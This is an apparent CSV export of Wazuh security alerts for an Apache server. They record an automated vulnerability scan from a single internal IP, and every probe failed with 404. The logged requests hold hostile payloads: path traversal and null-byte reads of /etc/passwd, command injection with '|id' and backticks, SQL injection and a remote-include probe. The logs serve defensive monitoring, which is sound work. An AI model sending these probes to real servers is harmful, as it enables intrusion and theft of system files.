_index,_id,_version,_score,_source.agent.ip,_source.agent.name,_source.agent.id,_source.manager.name,_source.data.protocol,_source.data.srcip,_source.data.id,_source.data.url,_source.rule.firedtimes,_source.rule.mail,_source.rule.level,_source.rule.pci_dss,_source.rule.tsc,_source.rule.description,_source.rule.groups,_source.rule.id,_source.rule.nist_800_53,_source.rule.gdpr,_source.decoder.name,_source.full_log,_source.input.type,_source.@timestamp,_source.location,_source.id,_source.timestamp,_source.rule.mitre.technique,_source.rule.mitre.id,_source.rule.mitre.tactic,_source.previous_output,_source.rule.frequency,_source.rule.info,_source.predecoder.hostname,_source.predecoder.program_name,_source.predecoder.timestamp,_source.data.dstuser,_source.data.srcport,_source.decoder.parent,_source.rule.hipaa
wazuh-alerts-4.x-2023.10.20,_MBWTosBpjjGT_ibPMls,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/scripts/contrib/forms/evaluation/C_FormEvaluation.class.php?fileroot=/etc/passwd%00,665,false,6,"[""6.5"",""11.4"",""6.5.1""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Common web attack.,"[""web"",""accesslog"",""attack""]",31104,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /scripts/contrib/forms/evaluation/C_FormEvaluation.class.php?fileroot=/etc/passwd%00 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:48.667",/var/log/apache2/access.log,1697826348.6321885,"Oct 20, 2023 @ 18:25:48.667","[""Process Injection"",""File and Directory Discovery"",""Exploit Public-Facing Application""]","[""T1055"",""T1083"",""T1190""]","[""Defense Evasion"",""Privilege Escalation"",""Discovery"",""Initial Access""]", , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,_cBWTosBpjjGT_ibPMls,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/DVWA/contrib/forms/evaluation/C_FormEvaluation.class.php?fileroot=/etc/passwd%00,666,false,6,"[""6.5"",""11.4"",""6.5.1""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Common web attack.,"[""web"",""accesslog"",""attack""]",31104,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /DVWA/contrib/forms/evaluation/C_FormEvaluation.class.php?fileroot=/etc/passwd%00 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:48.667",/var/log/apache2/access.log,1697826348.6322457,"Oct 20, 2023 @ 18:25:48.667","[""Process Injection"",""File and Directory Discovery"",""Exploit Public-Facing Application""]","[""T1055"",""T1083"",""T1190""]","[""Defense Evasion"",""Privilege Escalation"",""Discovery"",""Initial Access""]", , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,AcBWTosBpjjGT_ibPMps,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/cgi-bin/shared/help.php?page=../../../../../../../../../../etc/passwd%00,670,false,6,"[""6.5"",""11.4"",""6.5.1""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Common web attack.,"[""web"",""accesslog"",""attack""]",31104,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /cgi-bin/shared/help.php?page=../../../../../../../../../../etc/passwd%00 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:48.669",/var/log/apache2/access.log,1697826348.6324715,"Oct 20, 2023 @ 18:25:48.669","[""Process Injection"",""File and Directory Discovery"",""Exploit Public-Facing Application""]","[""T1055"",""T1083"",""T1190""]","[""Defense Evasion"",""Privilege Escalation"",""Discovery"",""Initial Access""]", , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,AsBWTosBpjjGT_ibPMps,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/ooz/tinfo.php?id=1697826345,6435,false,5,"[""6.5"",""11.4""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /ooz/tinfo.php?id=1697826345 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:48.670",/var/log/apache2/access.log,1697826348.6325276,"Oct 20, 2023 @ 18:25:48.670", , , , , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,BsBWTosBpjjGT_ibPMps,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/help/tinfo.php?id=1697826345,6437,false,5,"[""6.5"",""11.4""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /help/tinfo.php?id=1697826345 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:48.671",/var/log/apache2/access.log,1697826348.6329378,"Oct 20, 2023 @ 18:25:48.671", , , , , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,DcBWTosBpjjGT_ibPMps,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/tinfo.php?id=1697826345,495,false,10,"[""6.5"",""11.4""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Multiple web server 400 error codes from same source ip.,"[""web"",""accesslog"",""web_scan"",""recon""]",31151,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /tinfo.php?id=1697826345 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:48.674",/var/log/apache2/access.log,1697826348.6333060,"Oct 20, 2023 @ 18:25:48.674","[""Vulnerability Scanning""]","[""T1595.002""]","[""Reconnaissance""]","192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /oempro/member/index.php HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /DVWA/tinfo.php?id=1697826345 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /scripts/tinfo.php?id=1697826345 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /helpdesk/tinfo.php?id=1697826345 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /help/tinfo.php?id=1697826345 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /oneorzero/tinfo.php?id=1697826345 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /ooz/tinfo.php?id=1697826345 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /cgi-bin/www/delivery/ac.php?bannerid=-167+OR+1=1 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /OvCgi/OpenView5.exe HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /OvCgi/freeIPaddrs.ovpl?netnum=127.0.0.1&netmask=255.255.255.0&netid=127.0.0.1%20|%20id| HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /ovlaunch.exe HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",14, , , , , , , , 
wazuh-alerts-4.x-2023.10.20,D8BWTosBpjjGT_ibPMps,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/ocs/include/theme.inc.php?fullpath=/etc/passwd%00,674,false,6,"[""6.5"",""11.4"",""6.5.1""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Common web attack.,"[""web"",""accesslog"",""attack""]",31104,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /ocs/include/theme.inc.php?fullpath=/etc/passwd%00 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:48.676",/var/log/apache2/access.log,1697826348.6336042,"Oct 20, 2023 @ 18:25:48.676","[""Process Injection"",""File and Directory Discovery"",""Exploit Public-Facing Application""]","[""T1055"",""T1083"",""T1190""]","[""Defense Evasion"",""Privilege Escalation"",""Discovery"",""Initial Access""]", , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,EMBWTosBpjjGT_ibPMps,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/cgi-bin/member/index.php,6443,false,5,"[""6.5"",""11.4""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /cgi-bin/member/index.php HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:48.675",/var/log/apache2/access.log,1697826348.6336580,"Oct 20, 2023 @ 18:25:48.675", , , , , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,E8BWTosBpjjGT_ibPMps,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/cgi-bin/include/theme.inc.php?fullpath=/etc/passwd%00,675,false,6,"[""6.5"",""11.4"",""6.5.1""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Common web attack.,"[""web"",""accesslog"",""attack""]",31104,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /cgi-bin/include/theme.inc.php?fullpath=/etc/passwd%00 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:48.677",/var/log/apache2/access.log,1697826348.6338090,"Oct 20, 2023 @ 18:25:48.677","[""Process Injection"",""File and Directory Discovery"",""Exploit Public-Facing Application""]","[""T1055"",""T1083"",""T1190""]","[""Defense Evasion"",""Privilege Escalation"",""Discovery"",""Initial Access""]", , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,FcBWTosBpjjGT_ibPMps,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/DVWA/include/theme.inc.php?fullpath=/etc/passwd%00,677,false,6,"[""6.5"",""11.4"",""6.5.1""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Common web attack.,"[""web"",""accesslog"",""attack""]",31104,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /DVWA/include/theme.inc.php?fullpath=/etc/passwd%00 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:48.679",/var/log/apache2/access.log,1697826348.6339174,"Oct 20, 2023 @ 18:25:48.679","[""Process Injection"",""File and Directory Discovery"",""Exploit Public-Facing Application""]","[""T1055"",""T1083"",""T1190""]","[""Defense Evasion"",""Privilege Escalation"",""Discovery"",""Initial Access""]", , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,F8BWTosBpjjGT_ibPMps,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/observer/netcmd.php?cmd=whois&query=|id,6447,false,5,"[""6.5"",""11.4""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /observer/netcmd.php?cmd=whois&query=|id HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:48.680",/var/log/apache2/access.log,1697826348.6340224,"Oct 20, 2023 @ 18:25:48.680", , , , , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,HcBWTosBpjjGT_ibPMrl,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/cgi-bin/nx/common/cds/menu.inc.php?c_path=http://example.com/,6452,false,5,"[""6.5"",""11.4""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /cgi-bin/nx/common/cds/menu.inc.php?c_path=http://example.com/ HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:48.682",/var/log/apache2/access.log,1697826348.6343357,"Oct 20, 2023 @ 18:25:48.682", , , , , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,JMBWTosBpjjGT_ibPMrl,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/nuked-clan/index.php?file=News&op=phpinfo,6458,false,5,"[""6.5"",""11.4""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /nuked-clan/index.php?file=News&op=phpinfo HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:48.686",/var/log/apache2/access.log,1697826348.6349078,"Oct 20, 2023 @ 18:25:48.686", , , , , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,KsBWTosBpjjGT_ibPMrl,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/nucleus/nucleus/libs/PLUGINADMIN.php?GLOBALS[DIR_LIBS]=/etc/passwd%00,679,false,6,"[""6.5"",""11.4"",""6.5.1""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Common web attack.,"[""web"",""accesslog"",""attack""]",31104,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /nucleus/nucleus/libs/PLUGINADMIN.php?GLOBALS[DIR_LIBS]=/etc/passwd%00 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:48.689",/var/log/apache2/access.log,1697826348.6352175,"Oct 20, 2023 @ 18:25:48.689","[""Process Injection"",""File and Directory Discovery"",""Exploit Public-Facing Application""]","[""T1055"",""T1083"",""T1190""]","[""Defense Evasion"",""Privilege Escalation"",""Discovery"",""Initial Access""]", , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,MMBWTosBpjjGT_ibPMrl,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/DVWA/nucleus/libs/PLUGINADMIN.php?GLOBALS[DIR_LIBS]=/etc/passwd%00,682,false,6,"[""6.5"",""11.4"",""6.5.1""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Common web attack.,"[""web"",""accesslog"",""attack""]",31104,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /DVWA/nucleus/libs/PLUGINADMIN.php?GLOBALS[DIR_LIBS]=/etc/passwd%00 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:48.692",/var/log/apache2/access.log,1697826348.6357273,"Oct 20, 2023 @ 18:25:48.692","[""Process Injection"",""File and Directory Discovery"",""Exploit Public-Facing Application""]","[""T1055"",""T1083"",""T1190""]","[""Defense Evasion"",""Privilege Escalation"",""Discovery"",""Initial Access""]", , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,MsBWTosBpjjGT_ibPMrl,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/cgi-bin/nph-exploitscanget.cgi?host=`id`&port=80&errchk=0&idsbypass=0,6467,false,5,"[""6.5"",""11.4""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /cgi-bin/nph-exploitscanget.cgi?host=`id`&port=80&errchk=0&idsbypass=0 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:48.693",/var/log/apache2/access.log,1697826348.6358341,"Oct 20, 2023 @ 18:25:48.693", , , , , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,NMBWTosBpjjGT_ibPMrl,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/cgi-bin/tinfo.php?id=1697826345,497,false,10,"[""6.5"",""11.4""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Multiple web server 400 error codes from same source ip.,"[""web"",""accesslog"",""web_scan"",""recon""]",31151,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /cgi-bin/tinfo.php?id=1697826345 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:48.694",/var/log/apache2/access.log,1697826348.6359443,"Oct 20, 2023 @ 18:25:48.694","[""Vulnerability Scanning""]","[""T1595.002""]","[""Reconnaissance""]","192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /cgi-bin/nph-exploitscanget.cgi?host=`id`&port=80&errchk=0&idsbypass=0 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /index.php?file=News&op=phpinfo HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /scripts/index.php?file=News&op=phpinfo HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /cgi-bin/index.php?file=News&op=phpinfo HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /clan/index.php?file=News&op=phpinfo HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /klan/index.php?file=News&op=phpinfo HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /netcmd.php?cmd=whois&query=|id HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /clan-nic/index.php?file=News&op=phpinfo HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /whois.php?query=|id HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /nuked-clan/index.php?file=News&op=phpinfo HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /DVWA/netcmd.php?cmd=whois&query=|id HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",14, , , , , , , , 
wazuh-alerts-4.x-2023.10.20,NcBWTosBpjjGT_ibPMrl,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/gallery/inc/exif.inc.php?exif_prog=(echo%20-n%20'original_exif_prog_cmd_exec.nasl%3a%20'%3bid)%7c%7cecho,6468,false,5,"[""6.5"",""11.4""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:47 +0500] ""GET /gallery/inc/exif.inc.php?exif_prog=(echo%20-n%20'original_exif_prog_cmd_exec.nasl%3a%20'%3bid)%7c%7cecho HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:48.695",/var/log/apache2/access.log,1697826348.6361967,"Oct 20, 2023 @ 18:25:48.695", , , , , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,N8BWTosBpjjGT_ibPMrl,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/viewcode.jse+httplist+httplist/../../../../../system/autoexec.ncf,684,false,6,"[""6.5"",""11.4"",""6.5.1""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Common web attack.,"[""web"",""accesslog"",""attack""]",31104,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/viewcode.jse+httplist+httplist/../../../../../system/autoexec.ncf HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:49.111",/var/log/apache2/access.log,1697826349.6363070,"Oct 20, 2023 @ 18:25:49.111","[""Process Injection"",""File and Directory Discovery"",""Exploit Public-Facing Application""]","[""T1055"",""T1083"",""T1190""]","[""Defense Evasion"",""Privilege Escalation"",""Discovery"",""Initial Access""]", , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,OsBWTosBpjjGT_ibPMrl,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/cgi-bin/readfile.tcl?file=/etc/master.passwd,6472,false,5,"[""6.5"",""11.4""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /cgi-bin/readfile.tcl?file=/etc/master.passwd HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:49.127",/var/log/apache2/access.log,1697826349.6364774,"Oct 20, 2023 @ 18:25:49.127", , , , , , , , , , , , , 
